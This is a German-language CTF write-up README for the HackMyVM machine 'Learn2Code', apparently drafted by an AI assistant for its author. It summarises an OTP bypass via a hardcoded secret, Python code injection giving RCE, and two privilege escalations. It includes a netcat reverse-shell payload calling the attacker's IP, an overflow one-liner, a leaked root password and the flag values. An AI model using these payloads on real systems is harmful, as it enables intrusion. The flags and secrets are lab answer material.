Alles klar, Ben! Hier ist der Entwurf für das README der "Learn2Code"-Maschine.

# Learn2Code - HackMyVM (Medium)

![Learn2Code.png](Learn2Code.png)

## Übersicht

*   **VM:** Learn2Code
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Learn2Code)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 19. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Learn2Code_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Learn2Code" zu erlangen. Der initiale Zugriff erfolgte durch das Ausnutzen einer Webanwendung, die ein hartkodiertes Google Authenticator Secret verwendete und eine unsichere Funktion zur Ausführung von Python-Code bot. Dies ermöglichte Remote Code Execution (RCE) als `www-data`. Die erste Rechteausweitung zum Benutzer `learner` wurde durch einen Exploit einer SUID-Binary (`MakeMeLearner`) erreicht, die vermutlich für einen Buffer Overflow anfällig war. Die finale Eskalation zu Root gelang durch das Extrahieren eines hartkodierten Root-Passworts aus einer weiteren Binary (`MySecretPasswordVault`), die im Home-Verzeichnis des `learner`-Benutzers gefunden wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wget`
*   PHP (lokal)
*   Python3
*   `hydra` (versucht)
*   `nc` (netcat)
*   `stty`
*   `export`
*   `sudo` (versucht)
*   `find`
*   `ldd`
*   `file`
*   `MakeMeLearner` (Binary)
*   `MySecretPasswordVault` (Binary)
*   IDA Pro (`ida64`)
*   `su`
*   Standard Linux-Befehle (`cat`, `ls`, `cd`, `id`, `tail`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Learn2Code" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.157) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte nur Port 80 (HTTP, Apache 2.4.38) mit dem Titel "Access system".
    *   `gobuster` fand `index.php`, `todo.txt` und das Verzeichnis `/includes/php/`.
    *   Die Verzeichnisauflistung für `/includes/php/` war aktiv und enthüllte `GoogleAuthenticator.php`, `access.php`, `access.php.bak`, `coder.php` und `runcode.php`.

2.  **Code Analysis & OTP Bypass:**
    *   Analyse von `GoogleAuthenticator.php` (aus `/includes/php/`) enthüllte ein hartkodiertes Google Authenticator Secret: `S4I22IG3KHZIGQCJ`.
    *   Die Datei `access.php` verwendete dieses Secret, um den aktuellen OTP-Code zu generieren.
    *   Durch lokales Ausführen von `access.php` konnte der gültige OTP-Code erzeugt werden.
    *   Nach Eingabe des OTP-Codes auf der Webseite (`index.php`) wurde Zugriff auf `coder.php` gewährt.
    *   Das Eingabefeld auf `coder.php` interpretierte die Eingabe als Python-Code (Fehlermeldungen zeigten Python-Tracebacks).

3.  **Initial Access (RCE via Web Interface als `www-data`):**
    *   Ein Python-Payload zur Ausführung von Betriebssystembefehlen wurde erstellt: `__import__('os').system('nc 192.168.2.153 9001 -e /bin/bash')`. (IP und Port des Angreifers)
    *   Dieser Payload wurde in das Code-Eingabefeld auf `coder.php` eingegeben.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet.
    *   Eine Reverse Shell als Benutzer `www-data` wurde erfolgreich empfangen und stabilisiert.

4.  **Privilege Escalation (von `www-data` zu `learner` via SUID Binary):**
    *   Als `www-data` wurde nach SUID-Dateien gesucht. Die Datei `/usr/bin/MakeMeLearner` (SUID Root, SGID www-data) wurde identifiziert.
    *   Die Ausführung von `MakeMeLearner` mit einem langen, wiederholten Argument (z.B. `MakeMeLearner $(python3 -c 'print("dcba"*20)')`) führte dazu, dass der Benutzerkontext zu `learner` wechselte (wahrscheinlich durch einen Buffer Overflow).

5.  **Privilege Escalation (von `learner` zu `root` via Password Leak):**
    *   Im Home-Verzeichnis von `learner` (`/home/learner/`) wurde die User-Flag (`user.txt`) und eine weitere ELF-Binary namens `MySecretPasswordVault` gefunden.
    *   Die Binary `MySecretPasswordVault` wurde auf das Angreifer-System heruntergeladen.
    *   Analyse der Binary mit IDA Pro (`ida64`) enthüllte ein hartkodiertes Passwort: `NI98hIhj)(Jj`.
    *   Mit `su root` und dem gefundenen Passwort wurde erfolgreich zu Root gewechselt.
    *   Die Root-Flag wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Hartkodiertes Google Authenticator Secret:** Ein Secret für die Zwei-Faktor-Authentifizierung war direkt im PHP-Quellcode hinterlegt, was die Umgehung der OTP-Abfrage ermöglichte.
*   **Unsichere Code-Ausführung (Python Injection):** Eine Webseite (`coder.php`) erlaubte die direkte Eingabe und Ausführung von Python-Code, was zu Remote Code Execution (RCE) führte.
*   **SUID Binary Exploit:** Eine SUID-gesetzte Binary (`/usr/bin/MakeMeLearner`) war anfällig (vermutlich Buffer Overflow), was eine Rechteausweitung von `www-data` zu `learner` ermöglichte.
*   **Hartkodiertes Passwort in Binary:** Das Root-Passwort war in einer ELF-Binary (`MySecretPasswordVault`) gespeichert und konnte durch Reverse Engineering (IDA Pro) extrahiert werden.
*   **Verzeichnisauflistung aktiv:** Ermöglichte das einfache Auffinden und Herunterladen von serverseitigen Skripten.

## Flags

*   **User Flag (`/home/learner/user.txt`):** `N1c3m0veMat3!`
*   **Root Flag (`/root/root.txt`):** `Y0uG0TitbR0!`

## Tags

`HackMyVM`, `Learn2Code`, `Medium`, `Web RCE`, `Python Injection`, `Google Authenticator Bypass`, `SUID Exploit`, `Buffer Overflow`, `Password in Binary`, `IDA Pro`, `Linux`, `Privilege Escalation`
